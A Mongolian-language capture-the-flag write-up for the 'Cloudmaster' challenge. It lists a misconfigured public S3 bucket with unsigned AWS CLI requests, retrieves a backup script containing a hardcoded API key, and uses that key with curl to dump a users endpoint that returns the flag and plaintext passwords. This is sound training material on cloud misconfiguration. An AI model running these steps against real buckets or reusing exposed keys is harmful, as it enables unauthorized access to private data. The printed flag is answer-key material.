## Cloudmaster☁️ - Solution


AWS S3 дээр хостлогдсон [статик вэб](http://cloudmaster-web.s3-website-ap-southeast-1.amazonaws.com/) өгөгдсөн байх ба үүнээс аль region дээр хост хийгдсэн, болон **bucket**-н нэрийг харах боложмтой.
Эдгээр мэдээллүүд дээр үндэслэн статик вэбийг enumeration хийж үзээд

```
aws s3 --no-sign-request --region ap-southeast-1 ls s3://cloudmaster-web
```
гэж command line-с хандаж, статик вэб-д ашиглагдаж байгаа файлуудыг агуулсан bucket-г list хийхэд гарах үр дүн:

```
                           PRE script/  
                           PRE static/  
2022-11-22 20:46:05       7365 about.html  
2022-11-22 20:46:05       8812 contact.html  
2022-11-22 20:46:06       9969 glasses.html  
2022-11-22 20:46:06      22001 index.html  
2022-11-22 20:46:07       7372 shop.html  
```
гэж харагдаж байна. Эндээс вэб дээр ашиглагдаагүй байгаа directory нь **script/** гэдгийг хялбар ажиглаж болно. Тиймд path дээр нэмж өгөн list хийснээр:

```
$ aws s3 --no-sign-request --region ap-southeast-1 ls s3://cloudmaster-web/script/  
2022-11-23 15:12:57        620 backup.sh  
2022-11-23 15:04:10        595 healthcheck.sh  
```
үр дүн буцах болно. Уг хоёр файлыг browser ашиглан https://cloudmaster-web.s3-website-ap-southeast-1.amazonaws.com/script/backup.sh болон https://cloudmaster-web.s3-website-ap-southeast-1.amazonaws.com/script/healtcheck.sh
гэж хандан татах боломжтой. Эсвэл
```
$ aws s3 --no-sign-request --region ap-southeast-1 cp s3://cloudmaster-web/script/backup.sh ./
```
гэсэн коммандаар ч хуулан авах боломжтой юм. Shell script файлуудыг үзвэл хамгийн сонирхолтой файл нь **backup.sh** файл байх ба задлаж үзвэл:
```
$ cat backup.sh  
#!/bin/bash  

if [ curl -s -o /dev/null -w "%{http_code}" https://qwend8pezf.execute-api.ap-southeast-1.amazonaws.com/backup == 200 ]  
then  
    curl https://qwend8pezf.execute-api.ap-southeast-1.amazonaws.com/backup/products -s  > backup-products-$(date +'%Y-%-m-%d')  
    curl https://qwend8pezf.execute-api.ap-southeast-1.amazonaws.com/backup/carts -s  > backup-carts-$(date +'%Y-%-m-%d')  
    curl https://qwend8pezf.execute-api.ap-southeast-1.amazonaws.com/backup/users --header 'x-api-key: Zyk5ivM5eT1za3h8mlY5J4GspmZAl5EAnum3tIW9' -s  > backup-users-$(date +'%Y-%-m-%d')  
else  
    echo "error"  
fi  
```
гэсэн скрипт байна. Үүнээс тус бүрийн API-г ажиллуулж үзснээр
```
$ curl https://qwend8pezf.execute-api.ap-southeast-1.amazonaws.com/backup/users --header 'x-api-key: Zyk5ivM5eT1za3h8mlY5J4GspmZAl5EAnum3tIW9'  
[  
    {  
        "FLAG": "sictCTF{th3r3_1s_n0_cL0Ud_it'5_ju5t_s0m30n3_el53's_c0mput3r}"  
    },  
    {  
        "username": "petra",  
        "first_name": "petra",  
        "last_name": "timbers",  
        "age": "20",  
        "password": "petra@12345",  
        "is_admin": "False"  
    },  

```
гэснээр flag олдох болно. Уг даалгавар нь Cloud үйлчилгээг ашиглаж байгаа үед гаргадаг misconfiguration-ыг ашиглан үйлдэх боломжтой эмзэг мэдээллийг дэлгэх бодит амьдралын кэйстэй төстэй санааг агуулсан даалгавар юм.  

#### Flag: sictCTF{th3r3_1s_n0_cL0Ud_it'5_ju5t_s0m30n3_el53's_c0mput3r}
